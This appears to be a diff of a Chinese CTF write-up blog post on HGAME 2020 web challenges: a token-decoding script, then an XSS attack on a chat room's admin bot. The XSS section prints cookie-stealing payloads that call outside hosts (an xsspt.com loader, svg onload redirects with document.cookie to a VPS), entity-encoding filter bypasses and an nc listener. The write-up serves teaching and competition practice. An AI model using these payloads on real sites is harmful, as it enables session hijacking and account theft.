 <p>初始进去发现有源码及回显。<br>源码很简洁，关键在于<code>file_get_contents(&#39;mycode&#39;);</code>开始习惯性以为是<code>file_get_contents()</code>的命令执行漏洞。但是仔细看，我们并没有可控参数。因为这里的<code>&#39;mycode&#39;</code>指代的其实是filename,如果有疑问，那么不妨放到php中看看<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/6.jpg" class="lazyload" data-srcset="6.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="filename"><br>也就是说，mycode是一个文件，而且回显的不知名内容也是mycode里面的。</p>
@@ -507,48 +640,110 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>开始我想，这不是很简单吗，把编码倒过来解码不就好了？但是解出token后发现没有拿到flag，仔细回到原页面，发现一个大问题：<br>mycode中用于加密<code>$_SERVER[&#39;token&#39;]</code>的源码是变化的。唯一不变的是加密函数的数量总是10个，而加密函数的种类只有<code>encrypt()</code>,<code>base64_encode()</code>,<code>strrev()</code>,<code>str_rot13()</code>而这体现在index.php上回显的内容也是不断变换的。且基本上几秒钟就换掉了。也就是说，我们只能靠脚本解决，而不可能人手解决。<br>(当然，也许可以把几种孤零零的加密顺序的可能性不断试也许刚好碰对了。但这无异于大海捞针，就没有意义了。)</p>
 <p>首先这里先权衡下脚本的书写方式。开始我是想用php脚本的。但是我不会php中与python里requests库有相同功能的知识，那就只能用python脚本了。但随之而来的问题是，我们需要把加密的函数改一改，而且python里还没找到rot-13decode的库……（我就是因为找了个错的rot-13解码脚本导致白花了快一个小时）</p>
 <p>所以我的思路是这样的，请求两个页面，分别用正则拿到回显内容，以及mycode里10个加密函数组成的字符串。我再另写一个函数匹配字符串，每匹配到一个函数名字符串执行对应的解密函数。（稍微解释下，因为自己一开始弄反了。我们解密是要对回显内容从外向里解，故调用的函数顺序与我们从mycode里获得加密函数字符串中函数的顺序是一致的。<br>比如加密方式：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$密码&#x3D;base64_encode(str_rot13(strrev($原码)))</span><br></pre></td></tr></table></figure>
-<p>我们需要：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(strrev(str_rot13(base64_decode($密码))))</span><br></pre></td></tr></table></figure>
-<p>来得到原码。<br>但我封装好的匹配函数的调用顺序仍是</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64_decode , str_rot13(), strrev()</span><br></pre></td></tr></table></figure>
-<p>被自己一开始的php脚本的固化印象影响，弄反了顺序导致老是报错。不太应该。话不多说，贴脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_rot13</span><span class="params">(s, OffSet=<span class="number">13</span>)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encodeCh</span><span class="params">(ch)</span>:</span></span><br><span class="line">        f = <span class="keyword">lambda</span> x: chr((ord(ch) - x + OffSet) % <span class="number">26</span> + x)</span><br><span class="line">        <span class="keyword">return</span> f(<span class="number">97</span>) <span class="keyword">if</span> ch.islower() <span class="keyword">else</span> (f(<span class="number">65</span>) <span class="keyword">if</span> ch.isupper() <span class="keyword">else</span> ch)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(encodeCh(c) <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strrev</span><span class="params">(str)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(str)</span>:</span></span><br><span class="line">    res=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(str)):</span><br><span class="line">        res+= chr(ord(str[i]) - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec</span><span class="params">(string,token)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> string==<span class="string">'encrypt'</span>:</span><br><span class="line">        <span class="keyword">return</span> decrypt(token)</span><br><span class="line">    <span class="keyword">if</span> string==<span class="string">'str_rot13'</span>:</span><br><span class="line">        <span class="keyword">return</span> str_rot13(token)</span><br><span class="line">    <span class="keyword">if</span> string==<span class="string">'base64_encode'</span>:</span><br><span class="line">        f=str(base64.b64decode(token),<span class="string">'utf-8'</span>)</span><br><span class="line">        <span class="keyword">return</span> f</span><br><span class="line">    <span class="keyword">if</span> string==<span class="string">'strrev'</span>:</span><br><span class="line">        <span class="keyword">return</span> strrev(token)</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://76c59cdfab.php.hgame.n3ko.co'</span></span><br><span class="line">url1=<span class="string">'http://76c59cdfab.php.hgame.n3ko.co/mycode'</span></span><br><span class="line"></span><br><span class="line">res=requests.get(url)</span><br><span class="line">res1=requests.get(url1)</span><br><span class="line">key=re.findall(<span class="string">r'(.*)&lt;br&gt;'</span>,res.text)[<span class="number">2</span>]</span><br><span class="line"><span class="comment">#print(key)</span></span><br><span class="line">key1=re.findall(<span class="string">r'echo\((.*)\$'</span>,res1.text)[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#print(key1)</span></span><br><span class="line">key1=key1.replace(<span class="string">'('</span>,<span class="string">'&lt;br&gt;'</span>)</span><br><span class="line"><span class="comment">#print(key1)</span></span><br><span class="line">token=key</span><br><span class="line">print(<span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">    text = re.findall(<span class="string">r'(.*?)&lt;br&gt;'</span>, key1)[i]</span><br><span class="line">    token=exec(text,token)</span><br><span class="line"></span><br><span class="line">print(token)</span><br><span class="line"></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">'token'</span>:token</span><br><span class="line">&#125;</span><br><span class="line">flag=requests.post(url=url,data=data)</span><br><span class="line">print(flag.text)</span><br></pre></td></tr></table></figure>
+<pre><code>$密码=base64_encode(str_rot13(strrev($原码)))</code></pre><p>我们需要：</p>
+<pre><code>echo(strrev(str_rot13(base64_decode($密码))))</code></pre><p>来得到原码。<br>但我封装好的匹配函数的调用顺序仍是</p>
+<pre><code>base64_decode , str_rot13(), strrev()</code></pre><p>被自己一开始的php脚本的固化印象影响，弄反了顺序导致老是报错。不太应该。话不多说，贴脚本</p>
+<pre><code class="python">import requests
+import re
+import base64
 
+
+def str_rot13(s, OffSet=13):
+    def encodeCh(ch):
+        f = lambda x: chr((ord(ch) - x + OffSet) % 26 + x)
+        return f(97) if ch.islower() else (f(65) if ch.isupper() else ch)
+
+    return &#39;&#39;.join(encodeCh(c) for c in s)
+
+def strrev(str):
+    return str[::-1]
+
+
+def decrypt(str):
+    res=&#39;&#39;
+    for i in range(0,len(str)):
+        res+= chr(ord(str[i]) - 1)
+    return res
+
+def exec(string,token):
+    if string==&#39;encrypt&#39;:
+        return decrypt(token)
+    if string==&#39;str_rot13&#39;:
+        return str_rot13(token)
+    if string==&#39;base64_encode&#39;:
+        f=str(base64.b64decode(token),&#39;utf-8&#39;)
+        return f
+    if string==&#39;strrev&#39;:
+        return strrev(token)
+
+url=&#39;http://76c59cdfab.php.hgame.n3ko.co&#39;
+url1=&#39;http://76c59cdfab.php.hgame.n3ko.co/mycode&#39;
+
+res=requests.get(url)
+res1=requests.get(url1)
+key=re.findall(r&#39;(.*)&lt;br&gt;&#39;,res.text)[2]
+#print(key)
+key1=re.findall(r&#39;echo\((.*)\$&#39;,res1.text)[0]
+#print(key1)
+key1=key1.replace(&#39;(&#39;,&#39;&lt;br&gt;&#39;)
+#print(key1)
+token=key
+print(&#39;\n&#39;)
+for i in range(0, 10):
+    text = re.findall(r&#39;(.*?)&lt;br&gt;&#39;, key1)[i]
+    token=exec(text,token)
+
+print(token)
+
+data={
+    &#39;token&#39;:token
+}
+flag=requests.post(url=url,data=data)
+print(flag.text)
+</code></pre>
 <p>其中为了方便，把几个解密函数重新封装一下。<code>decrypt()</code>很好写，<code>str_rot13()</code>从网上嫖的。<code>exec()</code>就是用于匹配字符串并执行的函数，注意其中的base64要转字符串形式，不然解出来是二进制data；之后的<code>key</code>与<code>key1</code>分别用于获取请求的内容中我们要利用的回显与函数部分。这里需要自己调整一下,比如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key&#x3D;re.findall(r&#39;(.*)&lt;br&gt;&#39;,res.text)[2]</span><br></pre></td></tr></table></figure>
-<p>我用re的<code>findall()</code>函数，由于返回的是列表故要记得根据<code>res.text</code>调整对应的下标。<br>之后我也用正则函数，匹配出函数字符串，去掉括号部分，并在之后调用<code>exec()</code>函数时，再次利用<code>findall()</code>的匹配得到函数名组成的列表，依次调用。最后解出token，post请求拿到flag。<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/17.jpg" class="lazyload" data-srcset="17.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"><br>从flag也可以看出，我们也能用php脚本……然而我tcl而不会，不然可以省掉不少时间。</p>
+<pre><code>key=re.findall(r&#39;(.*)&lt;br&gt;&#39;,res.text)[2]</code></pre><p>我用re的<code>findall()</code>函数，由于返回的是列表故要记得根据<code>res.text</code>调整对应的下标。<br>之后我也用正则函数，匹配出函数字符串，去掉括号部分，并在之后调用<code>exec()</code>函数时，再次利用<code>findall()</code>的匹配得到函数名组成的列表，依次调用。最后解出token，post请求拿到flag。<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/17.jpg" class="lazyload" data-srcset="17.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"><br>从flag也可以看出，我们也能用php脚本……然而我tcl而不会，不然可以省掉不少时间。</p>
 <h1 id="Cosmos的聊天室"><a href="#Cosmos的聊天室" class="headerlink" title="Cosmos的聊天室"></a>Cosmos的聊天室</h1><p>  花了最长时间的一道题……但毕竟是对我来说最难的一道了，做的非常辛苦但是又有许多收获。所以就着重笔墨多记录下这道题，顺便当自己的学习笔记好了。</p>
 <p>进入界面<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/8.jpg" class="lazyload" data-srcset="8.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="界面"></p>
 <p>首先当然是判断漏洞类型了。<br>从题目名字可以知道，可能是个前端漏洞。由于界面开始就提供了一个<code>Flag is here</code>的button。点击进去后发现提示<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/9.jpg" class="lazyload" data-srcset="9.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="token"><br>这里直接说明我们需要admin的token才能拿到flag。好的，前端+token，应该不难想到需要我们通过xss打到admin的cookie来获取token了。<br>然后整理下思路，大概是如此:通过message提交payload。然后下面一个验证码code用脚本跑出来。每次点击’提交’时，就会把之前传过的所有message都发给bot。bot自然是带有admin权限的了，那么它访问时触发我们的payload,我们拿到token就可以访问/flag了。</p>
 <p>下面的验证方式并不难，只是会强行耗时间。通常用脚本跑出来都是7,8位数。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">999999999</span>):</span><br><span class="line">     code=hashlib.md5(str(i).encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">     print(code[:<span class="number">6</span>])</span><br><span class="line">     <span class="keyword">if</span> code[:<span class="number">6</span>]==<span class="string">'bfa9a6'</span>:</span><br><span class="line">         print(i)</span><br><span class="line">         <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<pre><code class="python">import hashlib
+
+for i in range(1,999999999):
+     code=hashlib.md5(str(i).encode(&#39;utf-8&#39;)).hexdigest()
+     print(code[:6])
+     if code[:6]==&#39;bfa9a6&#39;:
+         print(i)
+         break</code></pre>
 <p>但是message的处理就不简单了。简单的fuzz后会发现存在过滤与特殊处理。这点之后再说。好在题目说明了，等我们测试成功后再提交验证码。这样所有内容都能交到adminbot手上，不至于狂跑脚本浪费时间。</p>
 <p>其实自己在这道题之前并没有真正意义上做过xss打cookie类型的题目。头一次听说是在校赛上一道simple_xss的题目。那道题就是简单的过滤下用xss打cookie（当时题目出了不少bug，甚至源码泄露直接拿flag都行……）。不过我只知道最基础的xsspayload，根本不会利用xss打cookie。于是自己先选择百度+google，得知需要xss平台。<br>我用的这个在线网站：<a href="http://xsspt.com/" target="_blank" rel="noopener">http://xsspt.com/</a><br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/10.jpg" class="lazyload" data-srcset="10.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="平台"><br>于是明白，其实就是在xss平台创建一个项目，添加默认模板以及xss.js模板,之后只要在xss漏洞处尝试平台提供给我们的payload即可。比如：<img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/11.jpg" class="lazyload" data-srcset="11.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="payload"><br>即可执行xss打cookie。上面项目几个记录都是我在本地的DVWA上用xss-reflected这个漏洞的low级别的输入打的。</p>
 <p>同时也注意到几点，以上payload基本上是这样几个形式</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.&lt;script src&#x3D;http:&#x2F;&#x2F;xsspt.com&#x2F;mlRJMn&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">2.&lt;img src&#x3D;x onerror&#x3D;eval(atob(&#39;cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8veHNzcHQuY29tL21sUkpNbj8nK01hdGgucmFuZG9tKCk&#x3D;&#39;))&gt;</span><br><span class="line"></span><br><span class="line">3.javascript:eval(&#39;window.s&#x3D;document.createElement(&quot;script&quot;);window.s.src&#x3D;&quot;&#x2F;&#x2F;xsspt.com&#x2F;mlRJMn&quot;;document.body.appendChild(window.s)&#39;)</span><br></pre></td></tr></table></figure>
-<p>我分之为3种：<br>1.<code>&lt;script&gt;</code>标签的经典payload。src属性是外部引用<br>2.<code>&lt;img&gt;</code>标签的onerror属性，也是一种经典payload。同时用上<code>eval(atob())</code>处理base64字符串来bypass。还原下是这样的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s&#x3D;createElement(&#39;script&#39;);body.appendChild(s);s.src&#x3D;&#39;http:&#x2F;&#x2F;xsspt.com&#x2F;mlRJMn?&#39;+Math.random()</span><br></pre></td></tr></table></figure>
-<p>3.以及第三种javascript伪协议。有效避免了尖括号的存在。<br>上面1,2两种payload我都用DVWA打到cookie了。第三种不行。</p>
+<pre><code>1.&lt;script src=http://xsspt.com/mlRJMn&gt;&lt;/script&gt;
+
+2.&lt;img src=x onerror=eval(atob(&#39;cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwOi8veHNzcHQuY29tL21sUkpNbj8nK01hdGgucmFuZG9tKCk=&#39;))&gt;
+
+3.javascript:eval(&#39;window.s=document.createElement(&quot;script&quot;);window.s.src=&quot;//xsspt.com/mlRJMn&quot;;document.body.appendChild(window.s)&#39;)</code></pre><p>我分之为3种：<br>1.<code>&lt;script&gt;</code>标签的经典payload。src属性是外部引用<br>2.<code>&lt;img&gt;</code>标签的onerror属性，也是一种经典payload。同时用上<code>eval(atob())</code>处理base64字符串来bypass。还原下是这样的：</p>
+<pre><code>s=createElement(&#39;script&#39;);body.appendChild(s);s.src=&#39;http://xsspt.com/mlRJMn?&#39;+Math.random()</code></pre><p>3.以及第三种javascript伪协议。有效避免了尖括号的存在。<br>上面1,2两种payload我都用DVWA打到cookie了。第三种不行。</p>
 <p>回到题目中来，这道题目的过滤比想象中严格的多。我把做题时的FUZZ结果贴下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.script关键字被转为 Hi there!</span><br><span class="line">2.输入内容转为大写</span><br><span class="line">3.标签整体过滤&lt;&gt;</span><br></pre></td></tr></table></figure>
-<p>第一点还好，<code>script</code>过滤了还有诸如<code>img</code>,<code>svg/onload</code>等等payload。<br>第二点有点难办，因为通常标签包括属性大写后仍然能正常处理（大写绕过是一种常见的绕过script的方法），但是连属性的值都大写会严重影响我的payload正常执行。比如<code>ALERT(1)</code>是没法执行的。xss平台上第二种payload<code>base64</code>+<code>eval()</code>也是不行的。因为大写后函数不能正常执行了，编码也错误了。<br>第三点非常难办，只要有标签就给滤掉。没有什么别的绕过方法。<br>所以xss平台提供的payload全军覆没，必须想绕过方法。</p>
+<pre><code>1.script关键字被转为 Hi there!
+2.输入内容转为大写
+3.标签整体过滤&lt;&gt;</code></pre><p>第一点还好，<code>script</code>过滤了还有诸如<code>img</code>,<code>svg/onload</code>等等payload。<br>第二点有点难办，因为通常标签包括属性大写后仍然能正常处理（大写绕过是一种常见的绕过script的方法），但是连属性的值都大写会严重影响我的payload正常执行。比如<code>ALERT(1)</code>是没法执行的。xss平台上第二种payload<code>base64</code>+<code>eval()</code>也是不行的。因为大写后函数不能正常执行了，编码也错误了。<br>第三点非常难办，只要有标签就给滤掉。没有什么别的绕过方法。<br>所以xss平台提供的payload全军覆没，必须想绕过方法。</p>
 <p>这时我想到了去年暑假自己写的一篇文章。是关于xss.me上的xss挑战的。当时基本上一路看着wp做过来，好多都没什么印象。但现在再看却发现了意外宝藏：<a href="https://www.jianshu.com/p/18473e2174f3" target="_blank" rel="noopener">https://www.jianshu.com/p/18473e2174f3</a><br>比如<img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/12.jpg" class="lazyload" data-srcset="12.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="&lt;&gt;的绕过"><br>还有：<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/13.jpg" class="lazyload" data-srcset="13.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="大写的绕过"></p>
 <p>所以这里可以不闭合标签，利用实体编码完成xss。(没想到要靠自己的文章解决……好嘲讽啊)<br>好的，解决了尖括号与大写的问题后再解决一下<code>script</code>的问题吧。这里我找到了sky师傅之前做的xss题目以及他做往年hgame时对xss的绕过。<br><a href="https://skysec.top/2018/08/17/xss-ssrf-redis/" target="_blank" rel="noopener">https://skysec.top/2018/08/17/xss-ssrf-redis/</a><br><a href="https://skysec.top/2019/02/18/2019-Hgame-Web-Week4/" target="_blank" rel="noopener">https://skysec.top/2019/02/18/2019-Hgame-Web-Week4/</a></p>
 <p>第一道题xss部分过滤了许多关键字，比如<code>script</code>以及<code>onerror</code>但是可以用</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=<span class="string">"document.location='vpsip:port'"</span>&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">&lt;svg/onload=&quot;document.location=&#39;vpsip:port&#39;&quot;&gt;</code></pre>
 <p>(这里同时也提醒我，不一定要用xss平台，用vps上的nc监听也可以。)<br>同时用下面的payload打cookie:</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=<span class="string">"document.location='vpsip:port/?'+document.cookie"</span>&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">&lt;svg/onload=&quot;document.location=&#39;vpsip:port/?&#39;+document.cookie&quot;&gt;</code></pre>
 <p>这里是用网页ip后的参数带出cookie。看到后面我的结果就明白了。<br>加上师傅hgame的payload其中的charcode部分其实就是</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.location.href=<span class="string">"vpsip:port/?s="</span>+<span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">window.location.href=&quot;vpsip:port/?s=&quot;+document.cookie;</code></pre>
 <p>所以明白了获取cookie的payload格式。那么对此题，我们的理想payload就是</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=<span class="string">"window.location.href="</span>ip:<span class="number">7788</span>/?s=<span class="string">"+document.cookie;"</span>&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">&lt;svg/onload=&quot;window.location.href=&quot;ip:7788/?s=&quot;+document.cookie;&quot;&gt;</code></pre>
 <p>这里我出于隐私把自己的ip滤掉，只显示我监听的是7788端口。</p>
 <p>那么编码，去尖括号后，我们实际提交的payload为：(这里我把ip换成127.0.0.1)</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=<span class="string">"&amp;#x77;&amp;#x69;&amp;#x6e;&amp;#x64;&amp;#x6f;&amp;#x77;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x2e;&amp;#x68;&amp;#x72;&amp;#x65;&amp;#x66;&amp;#x3d;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x31;&amp;#x32;&amp;#x37;&amp;#x2e;&amp;#x30;&amp;#x2e;&amp;#x30;&amp;#x2e;&amp;#x31;&amp;#x3a;&amp;#x37;&amp;#x37;&amp;#x38;&amp;#x38;&amp;#x2f;&amp;#x3f;&amp;#x73;&amp;#x3d;&amp;#x22;&amp;#x2b;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x3b;"</span></span><br></pre></td></tr></table></figure>
+<pre><code class="javascript">&lt;svg/onload=&quot;&amp;#x77;&amp;#x69;&amp;#x6e;&amp;#x64;&amp;#x6f;&amp;#x77;&amp;#x2e;&amp;#x6c;&amp;#x6f;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6f;&amp;#x6e;&amp;#x2e;&amp;#x68;&amp;#x72;&amp;#x65;&amp;#x66;&amp;#x3d;&amp;#x22;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3a;&amp;#x2f;&amp;#x2f;&amp;#x31;&amp;#x32;&amp;#x37;&amp;#x2e;&amp;#x30;&amp;#x2e;&amp;#x30;&amp;#x2e;&amp;#x31;&amp;#x3a;&amp;#x37;&amp;#x37;&amp;#x38;&amp;#x38;&amp;#x2f;&amp;#x3f;&amp;#x73;&amp;#x3d;&amp;#x22;&amp;#x2b;&amp;#x64;&amp;#x6f;&amp;#x63;&amp;#x75;&amp;#x6d;&amp;#x65;&amp;#x6e;&amp;#x74;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6f;&amp;#x6b;&amp;#x69;&amp;#x65;&amp;#x3b;&quot;
+</code></pre>
 <p>在题目界面提交后我们看看有没有成功插入<br><img src="/2020/01/31/%E6%9D%AD%E7%94%B5hgame-week2/14.jpg" class="lazyload" data-srcset="14.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="message payload"><br>可以看到，虽然回显显示的一个无内容的方框。但我的payload被成功解析。<br>同时在vps上监听端口7788</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7788</span><br></pre></td></tr></table></figure>
